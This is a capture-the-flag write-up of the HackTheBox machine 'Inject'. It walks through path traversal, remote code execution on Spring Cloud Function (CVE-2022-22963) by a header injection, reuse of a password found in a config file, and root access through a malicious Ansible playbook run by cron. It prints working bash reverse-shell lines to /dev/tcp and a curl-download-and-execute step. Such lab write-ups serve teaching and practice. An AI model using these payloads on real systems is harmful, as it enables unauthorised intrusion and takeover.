---
title: "HackTheBox - Inject"
author: Nasrallah
description: ""
date: 2024-12-19 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, pathtraversal, java, cve, rce]
img_path: /assets/img/hackthebox/machines/inject
image:
    path: inject.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Inject](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/inject) from [HackTheBox](https://hacktheboxltd.sjv.io/anqPJZ) has a website vulnerable to path traversal allowing to read files and identify a dependency running on the website that's vulnerable to rce giving us a foothold. Once in we identify a user password on a config file, the new user has write permission on a directory that has yaml files, we use pspy64 and find a cronjob running the yaml file on that folder. We create a malicious yaml that sends us a shell and get root.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Host is up (0.50s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found port 22 running SSH and 8080 running nagios web server.

### Web

![website](1.png)

It's a cloud website where we can store files.

There is an upload at the top right, let's click it.

![upload](2.png)

I tried uploading a normal file but it only accept images.

Let's upload the image

![img](3.png)

After uploading the image we get a link to our image `http://10.10.11.204:8080/show_image?img=tmux.png`

Let's test for path traversal to read `/etc/passwd` file.

![passwd](4.png)

It worked!

Not only we can read files, but we can also list directories.

![dire](5.png)

I didn't find any low hanging fruits like ssh keys or password unfortunately.

Let's search in the website files.

![www](6.png)

We found the `WebApp` directory that has some java files.

Reading the `pom.xml` file reveals some juicy information.

![pom](7.png)

The file has the dependencies used by the web application, and searching for each one of those we find that the `spring cloud function web` has an RCE vulnerability [cve-2022-22963](https://spring.io/security/cve-2022-22963)

## **Foothold**

To exploit this we need to send a post request to `/functionRouter` with the following header.

```java
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("cmd")
```

I first run a ping to my box to see if it can reach it.

![ping](8.png)

Great! Now let's get a shell.

First i put the following bash rev shell to a file.

```bash
bash -i >& /dev/tcp/10.10.16.7/9001 0>&1
```

I uploaded the file to `/tmp` directory of the target.

```java
T(java.lang.Runtime).getRuntime().exec('curl 10.10.16.7/shell.sh -o /tmp/shell.sh')
```

I set up my listener and executed the file.

```java
T(java.lang.Runtime).getRuntime().exec('bash /tmp/shell.sh')
```

```terminal
[★]$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.228.213] 35962
bash: cannot set terminal process group (6704): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
frank@inject:/$ export TERM=xterm
export TERM=xterm
frank@inject:/$ ^Z
zsh: suspended  nc -lvnp 9001
                                                                                                                                                                                              
┌──[10.10.16.7]─[sirius💀parrot]-[~]
└──╼[★]$ stty raw -echo;fg        
[1]  + continued  nc -lvnp 9001

frank@inject:/$ 
```

## **Privilege Escalation**

### Frank -> Phil

On frank's home directory we find a hidden directory with the file `settings.xml`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

We find `phil`'s password there.

And now we can `su phil`

```terminal
frank@inject:~$ su phil
Password:
phil@inject:/home/frank$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil@inject:/home/frank$
```

### Phil -> root

We see that user phil is part of a group called staff.

With the help of the `find / -group staff 2>/dev/null`command, we find that users on this group has write permission on the `/opt/automation/tasks` directory.

```terminal
drwxrwxr-x 2 root staff 4096 Dec 18 08:50 tasks
```

Inside the directory is a yaml file.

```yaml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

Running `pspy64` we find a cronjob that's executing the yaml files inside the tasks directory.

```terminal
2024/12/18 08:36:33 CMD: UID=0     PID=1      | /sbin/init auto automatic-ubiquity noprompt
2024/12/18 08:38:01 CMD: UID=0     PID=24673  | /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml
2024/12/18 08:38:01 CMD: UID=0     PID=24671  | sleep 10
2024/12/18 08:38:01 CMD: UID=0     PID=24669  | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml               
```

With this information, we can create a malicious yml file that sends us a reverse shell, and since root is the one running the cronjob, we will get a root shell.

A quick search on google I found a yaml command execution code and modified it to give us a reverse shell.

```yaml
---                                                                                                               
- name: shell                                                                                                  
  hosts: localhost
  become: yes

  tasks:
  - name: hack
    shell: "bash -c '/bin/bash -i >& /dev/tcp/10.10.16.7/9001 0>&1'"
```

Now I'll write that in the tasks file and setup the listener and wait.

![root](9.png)

We got root!

## **Prevention and Mitigation**

### Outdated dependency

We found the `spring cloud function web` is outdated and even vulnerable to RCE which gave us access to the system.

Upgrade to the latest version and maintain an active update schedule for any patches that might be released in the future

## **References**

<https://spring.io/security/cve-2022-22963>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
